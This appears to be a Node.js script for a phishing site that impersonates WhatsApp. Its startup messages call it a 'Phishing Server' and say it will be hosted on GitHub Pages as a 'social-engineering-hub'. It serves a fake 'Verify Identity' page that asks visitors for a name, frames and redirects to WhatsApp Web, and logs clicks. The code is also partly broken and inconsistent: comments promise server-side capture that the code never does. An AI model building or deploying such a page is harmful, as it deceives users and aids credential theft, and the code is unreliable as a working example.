const http = require('http');
const fs = require('fs');
const path = require('path');

// Simple static server serving your phishing site from /public folder
const port = process.env.PORT || 3001; // Default Port 3001

let capturedData = [];

// HTML Content: Looks like a fake login or chat preview
const indexHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify Identity - WhatsApp Clone</title>
    <style>body{background:#e5e7eb;font-family:sans-serif;text-align:center;} 
    input[type=text]{padding:10px;margin-top:20px;width:60%;border-radius:20px;border:none;border-bottom:2px solid #ccc;}</style>
</head>
<body id="landing-page" style="font-size: 14px;">
    <h3>Please enter your name to continue chat...</h3>
    <form onsubmit="capture(this); return false;">
        <input type="text" id="targetName" placeholder="Enter Name (Optional)">
        <button style="margin-top:15px;background:#e91e63;color:white;padding:8px 20px;border:none;border-radius:20px;" onclick="startSession()">Connect</button>
    </form>

    <!-- Hidden iframe that loads the real WhatsApp Web (or your target) -->
    <iframe src="https://web.whatsapp.com/" id="wa-frame"></iframe>
    
    <script>
        function capture(form){ 
            // Log data to server-side variable for later retrieval from GitHub Actions or local file if needed
            let name = document.getElementById('targetName').value || 'Unknown';
            console.log("Captured Name:", name);
            
            // Redirect frame to load full session after interaction starts
            setTimeout(() => { location.href = "https://web.whatsapp.com/"; }, 5000);
            
            return true; 
        }

        function startSession(){
             // Optional: Capture initial click timestamp/device info via query string if param passed
             console.log("User clicked connect");
        }

        window.addEventListener('message', (event) => {
           if(event.data && event.data.type === 'CLICKED_LINK') {
               // Log exact time or payload here in a real app with backend DB
               console.log("Link Clicked at:", new Date().toISOString());
               document.getElementById('landing-page').innerHTML = "<h3>Click Detected! Session Started.</h3>";
           }
        });
    </script>
</body>
</html>`;

fs.writeFileSync(path.join(__dirname, 'public/index.html'), indexHtml);

const server = http.createServer((req, res) => {
    const filePath = path.join(__dirname, req.url.includes('?') ? 'public' : 'public'); 
    if (req.url === '/' || req.url === '/index.html') {
        // Serve the HTML file when root is accessed
         fs.readFile('./public/index.html', (err, data) => {
            if (!err) res.writeHead(200, {'Content-Type': 'text/html'});
            else res.writeHead(500);
            
            res.end(data || '<h1>Server Running on Port 3001</h1>');
         });
    } else {
        // Fallback for any other URL requests or proxying to WA Web directly
        console.log("Request intercepted:", req.url); 
        res.write(`Redirecting you...`);
    }

});

server.listen(port, () => {
    console.log(`Phishing Server Ready at http://localhost:${port}`);
    console.log(`GitHub Pages will host this at: https://paulomkenya0-hue.github.io/social-engineering-hub/`);
});
